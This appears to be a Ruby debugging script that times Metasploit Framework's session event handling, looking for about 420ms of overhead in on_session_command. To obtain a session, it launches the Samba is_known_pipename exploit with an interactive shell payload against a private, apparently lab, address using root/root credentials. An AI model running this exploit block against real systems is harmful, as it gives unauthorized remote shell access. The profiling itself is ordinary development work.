#!/usr/bin/env ruby
# frozen_string_literal: true

#
# Trace exactly where the 420ms overhead is in on_session_command
#

require 'benchmark'

def timed(name)
  result = nil
  time = Benchmark.realtime { result = yield }
  puts "    #{name}: #{(time * 1000).round(3)}ms"
  result
end

puts "=" * 60
puts "TRACING EVENT OVERHEAD"
puts "=" * 60

require 'msfenv'
require 'msf/base'

framework = Msf::Simple::Framework.create
puts "db.active: #{framework.db.active}"

# Get or create session
if framework.sessions.length == 0
  puts "Creating session..."
  exploit = framework.exploits.create('linux/samba/is_known_pipename')
  Msf::Simple::Framework.simplify_module(exploit)
  exploit.datastore['RHOSTS'] = '172.19.0.3'
  exploit.datastore['SMB_SHARE_NAME'] = 'myshare'
  exploit.datastore['SMB_USER'] = 'root'
  exploit.datastore['SMB_PASS'] = 'root'
  exploit.datastore['PAYLOAD'] = 'cmd/unix/interact'
  exploit.datastore['TARGET'] = 0

  driver = Msf::ExploitDriver.new(framework)
  driver.exploit = exploit
  driver.payload = framework.payloads.create('cmd/unix/interact')
  driver.payload.share_datastore(exploit.datastore)
  driver.target_idx = 0
  exploit.init_ui(nil, Rex::Ui::Text::Output::Buffer.new)
  driver.payload.init_ui(nil, Rex::Ui::Text::Output::Buffer.new)

  session = driver.run
  unless session
    puts "Failed!"
    exit 1
  end
end

session = framework.sessions.values.first
puts "Session: #{session.sid}"

# Get the subscriber
subscriber = framework.events.instance_variable_get(:@session_event_subscribers).first
puts "Subscriber: #{subscriber.class}"

# Manually trace on_session_command
puts "\n--- Tracing on_session_command ---"

command = "test command"

# Step 1: Call session_event
puts "\n  Step 1: session_event('session_command', session, :command => command)"
timed("session_event total") do
  # This is what session_event does:
  address = nil
  timed("session.session_host") do
    address = session.session_host
  end
  puts "      address: #{address}"

  if not (address and address.length > 0)
    puts "      NO ADDRESS - would return"
  else
    timed("framework.db.active check") do
      active = framework.db.active
      puts "      db.active: #{active}"
    end

    if framework.db.active
      puts "      Would do DB work here..."
    else
      puts "      DB not active - skipping"
    end
  end
end

# Step 2: Call report_session_event
puts "\n  Step 2: framework.db.report_session_event"
timed("report_session_event total") do
  framework.db.report_session_event({
    :etype => 'command',
    :session => session,
    :command => command
  })
end

# Now time the full on_session_command
puts "\n  Full on_session_command:"
timed("on_session_command total") do
  subscriber.on_session_command(session, command)
end

# Compare with calling event via framework.events
puts "\n  Via framework.events.on_session_command:"
timed("framework.events.on_session_command") do
  framework.events.on_session_command(session, command)
end

# Check if there are multiple subscribers
puts "\n--- All session event subscribers ---"
subs = framework.events.instance_variable_get(:@session_event_subscribers)
subs.each_with_index do |s, i|
  puts "  #{i}: #{s.class}"
  timed("subscriber #{i} on_session_command") do
    s.on_session_command(session, "test #{i}")
  end
end

puts "\nDone!"
